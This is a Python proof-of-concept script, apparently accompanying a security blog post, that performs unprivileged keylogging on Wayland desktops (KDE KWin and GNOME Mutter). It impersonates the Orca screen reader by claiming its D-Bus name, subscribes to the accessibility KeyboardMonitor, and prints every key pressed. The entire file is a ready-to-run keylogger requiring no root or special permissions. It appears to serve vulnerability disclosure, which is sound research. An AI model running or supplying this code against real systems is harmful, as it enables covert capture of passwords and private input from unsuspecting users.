#!/usr/bin/env python3
"""
Unprivileged Keylogging on Wayland via D-Bus Accessibility KeyboardMonitor
linnemanlabs.com - https://linnemanlabs.com/posts/hello-my-name-is-orca/

Captures raw keystrokes from the compositor's accessibility KeyboardMonitor
by claiming the org.gnome.Orca.KeyboardMonitor D-Bus bus name.

Confirmed on:
  - KDE Plasma / KWin 6.3.90+ (May 2025)
  - GNOME / Mutter 48.0+ (February 2025)

Requirements:
  - Wayland session with KWin or Mutter
  - Session D-Bus access
  - PyGObject (python3-gobject / python3-gi)

No root, input group, /dev/input access, capabilities, or accessibility
setting changes required.

Usage:
  python3 a11y-keyboardmonitor-poc.py
"""
import gi
gi.require_version('Gio', '2.0')
from gi.repository import Gio, GLib

bus = Gio.bus_get_sync(Gio.BusType.SESSION)

# Claim the Orca screen reader bus name
result = bus.call_sync(
    'org.freedesktop.DBus',
    '/org/freedesktop/DBus',
    'org.freedesktop.DBus',
    'RequestName',
    GLib.Variant('(su)', ('org.gnome.Orca.KeyboardMonitor', 0)),
    GLib.VariantType('(u)'),
    Gio.DBusCallFlags.NONE,
    -1, None
)
print(f"[*] RequestName result: {result}")  # 1 = acquired

# Now call WatchKeyboard
bus.call_sync(
    'org.freedesktop.a11y.Manager',
    '/org/freedesktop/a11y/Manager',
    'org.freedesktop.a11y.KeyboardMonitor',
    'WatchKeyboard',
    None, None,
    Gio.DBusCallFlags.NONE,
    -1, None
)
print("[+] WatchKeyboard succeeded!")

# Listen for KeyEvent signals
def on_key_event(connection, sender, path, interface, signal, params):
    pressed, flags, keysym, charcode, scancode = params.unpack()
    if pressed: # True = released, we log on press instead
        return

    if charcode >= 32 and charcode < 127:
        char = chr(charcode)
        print(f"{char}", end="", flush=True)
    elif keysym == 65293:
        print(f"\n", end="", flush=True)
    elif keysym == 65288:
        print(f"[BS]", end="", flush=True)
    elif keysym == 65289:
        print(f"[TAB]", end="", flush=True)
    elif keysym == 65507 or keysym == 65508:
        print(f"[CTRL]", end="", flush=True)
    elif keysym == 65505 or keysym == 65506:
        print(f"[SHIFT]", end="", flush=True)
    elif keysym == 65513 or keysym == 65514:
        print(f"[ALT]", end="", flush=True)
    elif keysym == 65515:
        print(f"[SUPER]", end="", flush=True)
    else:
        print(f"[{keysym}]", end="", flush=True)

bus.signal_subscribe(
    None,
    'org.freedesktop.a11y.KeyboardMonitor',
    'KeyEvent',
    None, None,
    Gio.DBusSignalFlags.NONE,
    on_key_event
)

print("[*] Listening for keystrokes...")
loop = GLib.MainLoop()
try:
    loop.run()
except KeyboardInterrupt:
    print("\n[*] Cleaning up")
    bus.call_sync(
        'org.freedesktop.a11y.Manager',
        '/org/freedesktop/a11y/Manager',
        'org.freedesktop.a11y.KeyboardMonitor',
        'UnwatchKeyboard',
        None, None,
        Gio.DBusCallFlags.NONE,
        -1, None
    )
